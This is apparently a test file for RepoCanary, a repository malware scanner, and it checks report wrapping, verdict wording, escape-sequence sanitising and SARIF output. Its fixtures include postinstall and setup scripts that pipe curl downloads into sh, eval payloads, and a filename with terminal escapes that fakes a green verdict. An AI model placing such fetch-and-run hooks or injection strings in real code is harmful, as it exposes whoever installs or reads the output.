import { FIXED_NOW, makeClient } from "./helpers.js";
import test from "node:test";
import assert from "node:assert/strict";
import { scanRepo } from "../src/scan.js";
import { renderHuman, renderJson, renderSarif, JSON_SCHEMA_VERSION } from "../src/report.js";
import { GREEN_MEANING } from "../src/verdict.js";

async function scanOf(files, meta = {}) {
  return scanRepo({ owner: "acme", repo: "widget", client: makeClient(files, { meta }), now: FIXED_NOW });
}

const GREEN_FILES = { "src/index.js": "export const x = 1;\n" };
const YELLOW_FILES = {
  "package.json": JSON.stringify({ name: "x", dependencies: { helper: "github:acme/helper" } }),
};
const RED_FILES = {
  "package.json": JSON.stringify({ name: "x", scripts: { postinstall: "curl http://c.example/p | sh" } }),
};

test("INVARIANT: no line of a human report exceeds 78 columns", async () => {
  // The report announces 78 columns, and everything it prints beyond its own
  // prose comes from the scanned repository: file paths, snippets, the head of
  // an install script. Left unwrapped, the scanned tree decides how wide the
  // reader's terminal output is. Three separate places got this wrong, so the
  // guard is on the whole rendering rather than on any one of them.
  const deep = `${"nested-directory-name/".repeat(6)}a-very-long-file-name-indeed.js`;
  const cases = [
    GREEN_FILES,
    YELLOW_FILES,
    RED_FILES,
    {
      // Every shape that has overhung: a deep path, an unbreakable URL, a
      // hex run, and an install script whose body is printed underneath.
      "package.json": JSON.stringify({
        name: "x",
        scripts: { postinstall: "node ./scripts/setup.js" },
        dependencies: { helper: "github:acme/helper" },
      }),
      "scripts/setup.js": `require("child_process").execSync("curl https://cdn.example.com/releases/download/v1.0.0/${"payload-segment-".repeat(8)}.tar.gz | sh");\n`,
      [deep]: `const u = "https://example.com/${"path-segment/".repeat(10)}end";\nconst h = "${"deadbeef".repeat(30)}";\neval(u);\n`,
    },
  ];

  // Owner, repository and ref go in the header, and all three are chosen by
  // whoever is scanned. GitHub allows 39 characters of owner and 100 of
  // repository. The first version of this test scanned "acme/widget" and so
  // never made the header long enough to overrun; the corpus then found two
  // real repositories that did.
  const metas = [
    {},
    {
      owner: "electron-react-boilerplate",
      repo: "electron-react-boilerplate",
      ref: "release/v5.0.0-long-branch-name",
    },
    { owner: "a".repeat(39), repo: "b".repeat(100), ref: "c".repeat(60) },
  ];

  for (const files of cases) {
    for (const meta of metas) {
      const result = await scanOf(files, meta);
      const rendered = renderHuman({ ...result, meta: { ...result.meta, ...meta } });
      for (const line of rendered.split("\n")) {
        assert.ok(line.length <= 78, `line of ${line.length} columns: ${JSON.stringify(line)}`);
      }
    }
  }
});

test("INVARIANT: every report states that green means nothing known matched", async () => {
  for (const files of [GREEN_FILES, YELLOW_FILES, RED_FILES]) {
    const result = await scanOf(files);
    assert.ok(renderHuman(result).includes(GREEN_MEANING));
    assert.ok(renderJson(result).includes(GREEN_MEANING) || result.verdict !== "green");
  }
});

test("a green verdict that still carries findings is worded as an AI clear, not as no match", async () => {
  const result = await scanOf(YELLOW_FILES);
  assert.equal(result.verdict, "yellow");
  const cleared = { ...result, verdict: "green", aiCleared: true, notes: [...result.notes, "AI pass (Gemini) cleared the static yellow verdict to green."] };
  const report = renderHuman(cleared);
  assert.ok(report.includes("Verdict: GREEN"));
  assert.ok(report.includes("Cleared:"));
  assert.ok(!report.includes("No known signatures matched in"));
  assert.ok(report.replace(/\s+/g, " ").includes("a model can be wrong"));
  assert.ok(report.includes(GREEN_MEANING));
  // A green with no findings keeps the plain headline.
  const plain = renderHuman(await scanOf(GREEN_FILES));
  assert.ok(plain.includes("No known signatures matched in"));
  assert.ok(!plain.includes("Cleared:"));
});

test("REGRESSION: a green carrying low findings is not reported as an AI clear", async () => {
  // A verdict turns yellow at three distinct low signals, so one or two are
  // green with findings printed under it and no model consulted. Wording
  // that as a clear told the reader a model had vouched for the snippets.
  // Real case: sindresorhus/slugify, green with one readme-install-first.
  const result = await scanOf({
    "package.json": JSON.stringify({ name: "ordinary", version: "1.0.0" }),
    "readme.md": "# ordinary\n\n## Install\n\n```sh\nnpm install ordinary\n```\n",
  });
  assert.equal(result.verdict, "green");
  assert.ok(result.findings.length > 0, "fixture must produce a low finding to be the case under test");
  assert.equal(result.stats.severities.high, 0);
  assert.equal(result.stats.severities.medium, 0);

  const report = renderHuman(result);
  assert.ok(!report.includes("Cleared:"), "no AI pass ran, so nothing was cleared");
  assert.ok(!report.includes("AI pass judged them benign"));
  assert.ok(!report.includes("a model read the flagged snippets"));
  assert.ok(report.includes("No known signatures matched in"));
});

test("REGRESSION: the JSON of an AI-cleared green does not deny that signatures fired", async () => {
  // Automation reads this file. A green the AI lowered from yellow used to
  // carry "none of RepoCanary's known attack signatures fired" beside the
  // very findings that did, with the model's involvement mentioned only in
  // prose in notes.
  const result = await scanOf(YELLOW_FILES);
  assert.equal(result.verdict, "yellow");
  const cleared = { ...result, verdict: "green", aiCleared: true };
  const j = JSON.parse(renderJson(cleared));

  assert.equal(j.verdict, "green");
  assert.equal(j.aiCleared, true, "the AI's involvement must be machine-readable, not only prose");
  assert.ok(j.findings.length > 0);
  assert.ok(!j.verdictMeaning.includes("none of RepoCanary's known attack signatures fired"));
  assert.ok(j.verdictMeaning.includes("signatures did fire"));
  // The word green keeps its definition even here.
  assert.ok(j.verdictMeaning.includes(GREEN_MEANING));

  // An ordinary green, and a green carrying low findings, claim no such thing.
  for (const files of [GREEN_FILES, { "readme.md": "# x\n\n## Install\n\n```sh\nnpm i x\n```\n" }]) {
    const plain = JSON.parse(renderJson(await scanOf(files)));
    assert.equal(plain.verdict, "green");
    assert.ok(!("aiCleared" in plain), "no AI pass ran, so the field must be absent");
    assert.ok(plain.verdictMeaning.includes(GREEN_MEANING));
  }
});

test("the human report is calm, complete, and pipe-friendly", async () => {
  const result = await scanOf(RED_FILES);
  const report = renderHuman(result);
  assert.ok(report.includes("Verdict: RED"));
  assert.ok(report.includes("package.json"));
  assert.ok(report.includes("Why it matters:"));
  assert.ok(report.includes("What to do:"));
  assert.ok(report.includes("Exit code: 2"));
  // No ANSI escapes, no emoji, and lines fit a narrow terminal.
  assert.ok(!report.includes("\u001b"));
  assert.ok(!/[\u{1F300}-\u{1FAFF}]/u.test(report));
  for (const line of report.split("\n")) assert.ok(line.length <= 100, line);
});

test("the JSON report carries the versioned schema and every finding field", async () => {
  const result = await scanOf(RED_FILES);
  const doc = JSON.parse(renderJson(result));
  assert.equal(doc.schemaVersion, JSON_SCHEMA_VERSION);
  assert.equal(doc.tool.name, "repocanary");
  assert.equal(doc.verdict, "red");
  assert.equal(doc.exitCode, 2);
  assert.deepEqual(doc.repository, { owner: "acme", repo: "widget", ref: "main" });
  const finding = doc.findings[0];
  for (const key of ["id", "severity", "file", "line", "snippet", "why", "next"]) {
    assert.ok(key in finding, key);
  }
  assert.ok(typeof doc.stats.filesScanned === "number");
});

test("the SARIF report is valid enough for code scanning uploads", async () => {
  const result = await scanOf(RED_FILES);
  const doc = JSON.parse(renderSarif(result));
  assert.equal(doc.version, "2.1.0");
  const run = doc.runs[0];
  assert.equal(run.tool.driver.name, "RepoCanary");
  assert.ok(run.tool.driver.rules.length > 0);
  const res = run.results[0];
  assert.ok(["error", "warning", "note"].includes(res.level));
  assert.ok(res.ruleId);
  assert.ok(res.locations[0].physicalLocation.artifactLocation.uri);
  assert.ok(res.locations[0].physicalLocation.region.startLine >= 1);
});

test("severity maps to SARIF levels: high error, medium warning, low note", async () => {
  const result = await scanOf(RED_FILES, {
    ownerCreatedAt: "2025-12-25T00:00:00Z", // adds a medium context finding
    ownerPublicRepos: 1, // adds a low context finding
  });
  const doc = JSON.parse(renderSarif(result));
  const levels = new Map(result.findings.map((f, i) => [f.severity, doc.runs[0].results[i].level]));
  assert.equal(levels.get("high"), "error");
  assert.equal(levels.get("medium"), "warning");
  assert.equal(levels.get("low"), "note");
});

test("SARIF carries the scan notes, so a capped scan is not silent on code scanning", () => {
  const doc = JSON.parse(
    renderSarif({
      verdict: "green",
      findings: [],
      meta: { owner: "acme", repo: "widget", ref: "main" },
      notes: ["3 symlinks were not followed.", "The scan stopped at the 40 file cap."],
      stats: { filesScanned: 40, bytesScanned: 100, findings: 0, treeTruncated: false },
    }),
  );
  const notifications = doc.runs[0].invocations[0].toolExecutionNotifications;
  assert.equal(notifications.length, 2);
  assert.match(notifications[1].message.text, /40 file cap/);
});

test("a repository cannot repaint the terminal through a path it chose", async () => {
  // Git allows almost any byte in a filename, so the path is repository text
  // like every other field. Wrapping handled its length; nothing handled its
  // bytes, and an erase-line plus cursor-up sequence painted over the red
  // verdict printed above it.
  const esc = String.fromCharCode(27);
  const path = `src/a${esc}[2K${esc}[1A${esc}[1A  Verdict: GREEN${esc}[999B.js`;
  const result = await scanOf({ "package.json": '{"name":"x"}', [path]: 'eval(atob("QQ=="))' });
  for (const render of [renderHuman, renderJson, renderSarif]) {
    assert.ok(!render(result).includes(esc), `${render.name} must not carry a raw escape out of the repository`);
  }
});

test("INVARIANT: the red verdict does not claim the pattern is only ever in malware", async () => {
  // The sentence printed under every red used to end "a pattern that is
  // essentially only ever present in malware. Treat this repository as
  // hostile." It was measured and found false: on 2026-09-09 the corpus held
  // twenty-seven reds and the benign standing set two, thirteen of them a
  // project's CI installing things on a build agent and three of them
  // software whose advertised purpose is the flagged behaviour. A claim a
  // reader can falsify in an hour costs more than the warning it carries.
  //
  // This is an invariant rather than a wording preference. Restoring the
  // universal is the failure, so the test names the shape and not the phrase.
  const scan = await scanOf(RED_FILES);
  assert.equal(scan.verdict, "red");
  const meaning = JSON.parse(renderJson(scan)).verdictMeaning;

  for (const claim of ["only ever", "always", "never legitimate", "treat this repository as hostile"]) {
    assert.ok(
      !meaning.toLowerCase().includes(claim),
      `the red meaning must not claim "${claim}": ${meaning}`,
    );
  }
  // And it has to say the limit that produces those twenty-nine, not merely
  // stop short of the false claim.
  assert.match(meaning, /reads files/i);
  assert.match(meaning, /cannot tell/i);
  // The instruction stays: it is the right one either way.
  assert.match(meaning, /do not run this repository/i);
  // The human render wraps at 78 columns, so compare the unwrapped text.
  const flat = renderHuman(scan).replace(/\s+/g, " ");
  assert.ok(flat.includes("cannot tell software whose advertised job"));
});

test("INVARIANT: a red's next steps do not accuse before the reader has read", async () => {
  // A red is a signature match. Three of the twenty-seven reds in the
  // regression corpus are projects doing their advertised job, so an
  // unconditional "report the repository" aims the tool at what it misreads.
  const scan = await scanOf(RED_FILES);
  assert.equal(scan.verdict, "red");
  // Next steps live in the human render only; it wraps at 78 columns, so
  // compare the unwrapped text.
  const flat = renderHuman(scan).replace(/\s+/g, " ");
  assert.ok(flat.includes("- Do not run npm install"), "the unconditional instruction must stay");
  assert.ok(
    flat.includes("- If the findings describe malice rather than the project's own purpose, report the repository"),
    "the report step must state its condition before the accusation",
  );
});

test("a branch name cannot put terminal controls into the header", async () => {
  const result = await scanOf(GREEN_FILES);
  const rendered = renderHuman({ ...result, meta: { ...result.meta, ref: "main\u009b8m‮NEERG" } });
  const header = rendered.split("\n")[0];
  assert.doesNotMatch(header, /[\u0080-\u009f‪-‮⁦-⁩]/);
});

test("SARIF locations are URIs, not raw paths", async () => {
  const result = await scanOf(RED_FILES);
  const sarif = JSON.parse(renderSarif({ ...result, findings: result.findings.map((f) => ({ ...f, file: "a b/#x?.js" })) }));
  const uris = sarif.runs[0].results.map((r) => r.locations[0].physicalLocation.artifactLocation.uri);
  assert.ok(uris.length > 0);
  for (const uri of uris) assert.equal(uri, "a%20b/%23x%3F.js");
});
